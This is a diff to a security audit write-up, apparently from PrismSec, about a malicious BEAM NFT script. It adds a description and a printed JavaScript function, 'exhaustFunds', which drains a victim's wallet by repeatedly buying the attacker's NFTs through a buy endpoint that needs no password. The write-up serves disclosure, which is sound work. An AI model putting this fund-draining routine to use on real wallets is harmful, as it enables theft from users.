@@ -41,6 +41,36 @@ Take a look at [nftengine.js](https://github.com/PRISM-Privacy/beamnft-audit/blo
 
 The malicious script takes advantage of the buy NFT api endpoint which doesnt require the users password, this allows the malicious actor to buy his own NFTs without the users knowledge in an iterative fashion until the users balance is exhausted!
 
+The script iterates over the NFT prices in the malicious actors collection, if the balance is bigger than the price of the NFT, it executes a buy order, and continues until it has check each NFT in the collection!
+
+```
+exhaustFunds = async (balance, nfts) => {
+  // balance in BEAM and GROTH
+  let beamBalance = balance / 100000000;
+  let grothBalance = balance;
+  let transactionFee = 100000000;
+
+  console.clear(); // sanitize console
+
+  console.log(`balance in BEAM: ${beamBalance} BEAM`);
+  console.log(`balance in GROTH: ${grothBalance} GROTH\n\n`);
+
+  // loop through nft object, show only nfts which are for sale (price > 0)
+  for (let key in nfts) {
+    if (nfts[key].price != 0 && nfts[key].price < grothBalance) {
+      let bought = await buyNft(nfts[key]._id, nfts[key].price);
+      grothBalance = grothBalance - (nfts[key].price + transactionFee); // update balance
+      console.log(`exhaused ${nfts[key].price / 100000000} BEAM`); // replace console.log with discord notification
+      //  TODO - Do we need to wait for => block confirmation before continue?
+    } else {
+      console.log(
+        "didnt exhaust, either NFT isnt for sale or balance too low to afford NFT"
+      );
+    }
+  }
+};
+```
+
 > The following image shows the required parameters to buy an NFT (no password required), the image after shows the required parameters to withdraw (requires password)
 
 <div align="center">
@@ -50,3 +80,5 @@ The malicious script takes advantage of the buy NFT api endpoint which doesnt re
 <div align="center">
   <img title="" src="images/withdrawendpoint.png" alt="PrismSec logo" data-align="center">
 </div>
+
+# 
